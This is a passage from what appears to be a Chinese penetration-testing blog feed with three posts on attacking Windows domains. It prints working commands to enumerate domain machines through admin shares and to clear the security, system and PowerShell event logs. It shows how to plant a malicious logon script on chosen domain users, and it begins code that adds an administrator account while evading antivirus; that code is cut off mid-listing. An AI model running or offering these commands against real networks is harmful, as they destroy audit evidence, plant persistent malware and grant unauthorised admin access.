DNS_SERVER_IP -sc <span class="string">u:</span>*</span><br><span class="line">详见：<span class="string">http:</span><span class="comment">//www.joeware.net/freetools/tools/adfind/usage.htm</span></span><br></pre></td></tr></table></figure></p><p>powerview在域内执行就可以。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Domain demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span>  <span class="comment">//domain参数请加完整的域名</span></span><br><span class="line">或</span><br><span class="line">Invoke-EnumerateLocalAdmin</span><br></pre></td></tr></table></figure><h2 id="0x01-查看域内机器的用户目录文件夹"><a href="#0x01-查看域内机器的用户目录文件夹" class="headerlink" title="0x01 查看域内机器的用户目录文件夹"></a>0x01 查看域内机器的用户目录文件夹</h2><p>确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ password /u:domain\domain_admins_user</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (</span><br><span class="line">                <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ /<span class="built_in">del</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>域管不用建立连接就可以访问域内计算机资源，因此以域管权限运行时可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>代码补充：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/NetWorkConnectIPC" target="_blank" rel="noopener">NetWorkConnectIPC</a></p><h2 id="0x02-域控日志"><a href="#0x02-域控日志" class="headerlink" title="0x02 域控日志"></a>0x02 域控日志</h2><p><code>wevtutil</code>为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用<code>epl</code>参数，直接重定向输出即可。<br><code>wevtutil</code>常用的场景是清理日志。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl <span class="string">"windows powershell"</span></span><br></pre></td></tr></table></figure></p><p>而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功）</p><font color="#0099ff" size="3">使用<code>wevtutil</code>结合python</font><ul><li><p>wevtutil</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /q:"Event[System[(EventID=<span class="number">4624</span> or EventID=<span class="number">4768</span> or EventID=<span class="number">4776</span>)]]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">1</span> &gt; EvtLogon.dat</span><br></pre></td></tr></table></figure></li><li><p>参数说明</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">qe:</span> 从日志或日志文件中查询事件；（默认xml格式显示）</span><br><span class="line"><span class="string">Security:</span> 指定安全事件的日志；</span><br><span class="line">/<span class="string">q:</span> 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；</span><br><span class="line">/<span class="string">f:</span> 以text格式显示</span><br><span class="line">/<span class="string">rd:</span> 指定读取事件的方向</span><br><span class="line">/<span class="string">c:</span> 指定个数</span><br><span class="line">该命令其它参数参考wevtutil /?</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment"># Python v2.7.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">evt = <span class="string">'EvtLogon.dat'</span></span><br><span class="line">fevt = open(evt,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># For Eliminate redundancies</span></span><br><span class="line">    lastdate = <span class="string">'lastdate'</span></span><br><span class="line">    lasttask = <span class="string">'lasttask'</span></span><br><span class="line">    <span class="comment"># 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'LogonStat.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        csv_write = csv.writer(csvfile)</span><br><span class="line">        csv_write.writerow([<span class="string">"Task"</span>, <span class="string">"Date"</span>, <span class="string">"Account Name"</span>, <span class="string">"Account Domain"</span>, <span class="string">"Logon Address"</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> eachline <span class="keyword">in</span> fevt:</span><br><span class="line">            <span class="keyword">if</span> eachline.find(<span class="string">'Event['</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = <span class="string">''</span></span><br><span class="line">                date = <span class="string">''</span></span><br><span class="line">                accname = <span class="string">''</span></span><br><span class="line">                logontype = <span class="string">''</span></span><br><span class="line">                logonaddr = <span class="string">''</span></span><br><span class="line">                skip = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Date:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                date = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Task:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (date == lastdate) <span class="keyword">and</span> (task == lasttask): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lastdate = date</span><br><span class="line">                    lasttask = task</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Name:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accname = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (task == <span class="string">'Logon'</span>) <span class="keyword">and</span> (accname.find(<span class="string">'$'</span>) &gt; <span class="number">-1</span>): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Domain:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accdomain = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Source Network Address:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                logonaddr = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">                <span class="keyword">if</span> logonaddr == <span class="string">'-'</span>:</span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (skip == <span class="number">0</span>) <span class="keyword">and</span> (task == <span class="string">'Logon'</span>):</span><br><span class="line">                    LogonStat = [[task, date, accname, accdomain, logonaddr]]</span><br><span class="line">                    csv_write.writerows(LogonStat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fevt.close()</span><br><span class="line">csvfile.close()</span><br></pre></td></tr></table></figure></li></ul><p>PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='<span class="number">10</span>'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=<span class="number">4624</span>) and TimeCreated[timediff(@SystemTime) &amp;lt;= <span class="number">2592000000</span>]]]"</span><br><span class="line"></span><br><span class="line">wevtutil qe Security /q:"*[System[(Keywords='<span class="number">0</span>x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-DNS解析记录"><a href="#0x03-DNS解析记录" class="headerlink" title="0x03 DNS解析记录"></a>0x03 DNS解析记录</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscmd <span class="number">127.0</span>.<span class="number">0.1</span> /enumrecords demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span>. /type A <span class="comment">//利用dnscmd导出dns正向解析记录</span></span><br><span class="line">dnscmd <span class="number">127.0</span>.<span class="number">0.1</span> /zoneprint demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> &gt;<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><code>C# .NET</code> 编写的工具 <a href="https://github.com/RcoIl/CSharp_Tools/tree/master/SharpADDNSDump" target="_blank" rel="noopener">SharpADDNSDump</a></p><h2 id="0x04-Exchange-日志"><a href="#0x04-Exchange-日志" class="headerlink" title="0x04 Exchange 日志"></a>0x04 Exchange 日志</h2><h3 id="4-1-Outlook-Web-Application"><a href="#4-1-Outlook-Web-Application" class="headerlink" title="4.1 Outlook Web Application"></a>4.1 <code>Outlook Web Application</code></h3><p><code>owa</code> 默认的登陆日志位置如下：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\i</span>netpub<span class="symbol">\l</span>ogs<span class="symbol">\L</span>ogFiles<span class="symbol">\W</span>3SVC1（W3SVC2）</span><br></pre></td></tr></table></figure><p>日志是根据时间（天）¬为单位进行分割的，比如 <code>u_ex190426</code> 就表示 <code>19 年 4 月 26 号</code>那一天的日志。</p><p>在实战中，可根据自己的实际需求，把指定时间段内的日志想办法拖回来即可。</p><p>部分内容如下：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019<span class="string">-04</span><span class="string">-26</span> 06:49:51 192.10.20.200 POST /owa/auth.owa &amp;CorrelationID=&lt;empty&gt;;&amp;ClientId=KFTFMZBXS0ATOXTCCJLOQ&amp;cafeReqId=c3db90a9<span class="string">-02</span>e3<span class="string">-4</span>fd0<span class="string">-8633</span><span class="string">-05</span>fb7799f4fd; 443 rcoil.me\pentest 192.10.20.104 Mozilla/5.0+(Windows+NT<span class="string">+10</span>.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/73.0.3683.103+Safari/537.36 https://exchange/owa/auth/logon.aspx?replaceCurrent=1&amp;url=https%3a%2f%2fexchange%2fowa 302 0 0 31</span><br></pre></td></tr></table></figure><p>此时我们需要的内容单单为：<code>rcoil.me\pentest 192.10.20.104</code>，其他数据可不理会。</p><h3 id="4-2-Outlook-客户端"><a href="#4-2-Outlook-客户端" class="headerlink" title="4.2 Outlook 客户端"></a>4.2 <code>Outlook</code> 客户端</h3><p><code>Outlook</code> 客户端登陆的默认日志文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V14\Logging\RPC<span class="built_in"> Client </span>Access</span><br></pre></td></tr></table></figure><h2 id="0x05【参考】"><a href="#0x05【参考】" class="headerlink" title="0x05【参考】"></a>0x05【参考】</h2><p><a href="http://cate4cafe.com/2018/11/21/wevtutil%E7%AD%9B%E9%80%89windows%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C/" target="_blank" rel="noopener">wevtutil筛选windows日志查询结果</a><br><a href="https://blog.csdn.net/dearggae/article/details/70147511" target="_blank" rel="noopener">[Tools]获取域环境内所有用户登录信息（附源码及程序）</a><br><a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢？</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前见到有人在讨论&lt;a href=&quot;https://www.t00ls.net/viewthread.php?tid=47649&amp;amp;extra=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域内用户在域内的机器ip怎么查呢&lt;/a&gt;，集思广益，结合答复及自己的观点，总结了以下内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
    <id>https://rcoil.me/2018/11/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/</id>
    <published>2018-11-16T08:33:21.000Z</published>
    <updated>2019-10-31T15:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#DC143C" size="3">摘要：</font>采取直接的手段不能够解决问题，只好曲线救国。<br><a id="more"></a><br>声明：只是作为搬运工。</p><h2 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h2><ul><li><p>利用前置条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员权限</span><br></pre></td></tr></table></figure></li><li><p>使用场合</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">知道目标域用户名称，探测不到域用户对应机器名或<span class="built_in">IP</span>；</span><br><span class="line">知道目标机器<span class="built_in">IP</span>，但是无法通往上控；</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><p><font color="#DC143C" size="3">PS：</font>以下测试全部在域控上执行</p><h3 id="一）使用dsmod给指定域用户设置登陆脚本"><a href="#一）使用dsmod给指定域用户设置登陆脚本" class="headerlink" title="一）使用dsmod给指定域用户设置登陆脚本"></a>一）使用dsmod给指定域用户设置登陆脚本</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">dsmod<span class="built_in"> user </span>-loscr <span class="string">"test.bat"</span> <span class="string">"CN=x,OU=x,DC=x,DC=x,DC=x"</span></span><br></pre></td></tr></table></figure></p><p>测试结果：<br>PS: 测试机为<code>Win-XP x86</code>，第二次注销重新登陆bat脚本才执行，bat内容为<a href="mailto:`@calc.exe" target="_blank" rel="noopener">`@calc.exe</a>`。<br><img src="/image/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/blog_2018-11-16_18-18-23.png" alt=""></p><h3 id="二）登陆脚本给指定用户种马"><a href="#二）登陆脚本给指定用户种马" class="headerlink" title="二）登陆脚本给指定用户种马"></a>二）登陆脚本给指定用户种马</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">net<span class="built_in"> user </span>xp /scriptpath:test.bat # 内网域成员机器可以使用</span><br><span class="line">gpupdate /force  # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机</span><br></pre></td></tr></table></figure></p><p>测试结果与第一种方法一致</p><h3 id="三）使用PowerShell的Active-Directory模块"><a href="#三）使用PowerShell的Active-Directory模块" class="headerlink" title="三）使用PowerShell的Active Directory模块"></a>三）使用PowerShell的Active Directory模块</h3><p><code>ActiveDirectory.psd1</code>项目：<a href="https://github.com/samratashok/ADModule" target="_blank" rel="noopener">ADModule</a><br>命令：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> ActiveDirectory.psd1; 或者<span class="keyword">Import</span>-<span class="keyword">Module</span> Microsoft.ActiveDirectory.Management.dll</span><br><span class="line"><span class="keyword">Set</span>-ADUser -<span class="keyword">Identity</span> AD_USER -ProfilePath <span class="string">"filepath"</span> -ScriptPath <span class="string">"filename"</span></span><br></pre></td></tr></table></figure></p><p>参数说明</p><ul><li><p>Identity<br>通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个名字</span><br><span class="line">GUID（objectGUID）</span><br><span class="line">安全标识符（objectSid）</span><br><span class="line">SAM帐户名称（sAMAccountName）</span><br></pre></td></tr></table></figure></li><li><p>ProfilePath<br>指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</p></li><li>ScriptPath<br>指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</li></ul><p>测试结果与第一种方法一致</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</a><br><a href="https://www.t00ls.net/thread-48540-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48540-1-1.html</a><br><a href="https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;#DC143C&quot; size=&quot;3&quot;&gt;摘要：&lt;/font&gt;采取直接的手段不能够解决问题，只好曲线救国。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【编程】创建用户，并添加至管理组</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84/"/>
    <id>https://rcoil.me/2018/11/【编程】创建用户，并添加至管理组/</id>
    <published>2018-11-15T03:52:27.000Z</published>
    <updated>2019-10-31T16:10:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 因有些需求，需要本地/远程添加用户。所以直接选择<code>Windows API函数</code>进行编写，因为部分杀软限制了<code>CMD</code>。<br><a id="more"></a><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序名称：添加系统用户.exe(也可创建dll)</span><br><span class="line">编译平台：VS<span class="number">2015</span> C# (.NET Framework v<span class="number">4.0</span>)、Windows <span class="number">7</span> Ultimate <span class="keyword">x</span><span class="number">64</span></span><br><span class="line">编写语言：C++ (C#存在版本限制)</span><br><span class="line">测试条件：以管理员运行</span><br><span class="line">测试工具：zzz_exploit <span class="keyword">or</span> other</span><br><span class="line">测试平台：xp-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">2003</span>-<span class="keyword">x</span><span class="number">86</span>、win<span class="number">7</span>-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">2008</span>-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">10</span>-<span class="keyword">x</span><span class="number">64</span>(火绒) --&gt;均可成功添加</span><br></pre></td></tr></table></figure></p><h2 id="0x00-思路及原理"><a href="#0x00-思路及原理" class="headerlink" title="0x00 思路及原理"></a>0x00 思路及原理</h2><h3 id="一）编程思路"><a href="#一）编程思路" class="headerlink" title="一）编程思路"></a>一）编程思路</h3><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netuseradd" target="_blank" rel="noopener">NetUserAdd函数</a>添加普通权限的用户并指定级别。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetUserAdd</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD parm_err</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers" target="_blank" rel="noopener">NetLocalGroupAddMembers函数</a>将现有用户账号添加到现有本地组。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetLocalGroupAddMembers</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR groupname, <span class="comment">// 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   totalentries <span class="comment">// 指定buf参数指向的缓冲区中的条目数。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><h3 id="二）编写思路"><a href="#二）编写思路" class="headerlink" title="二）编写思路"></a>二）编写思路</h3><ul><li>定义USER_INFO_1 结构体<br>该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。</li><li>调用NetUserAdd添加普通权限账户</li><li>调用NetLocalGroupAddMembers添加到管理员组</li></ul><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><h3 id="一）exe生成"><a href="#一）exe生成" class="headerlink" title="一）exe生成"></a>一）exe生成</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 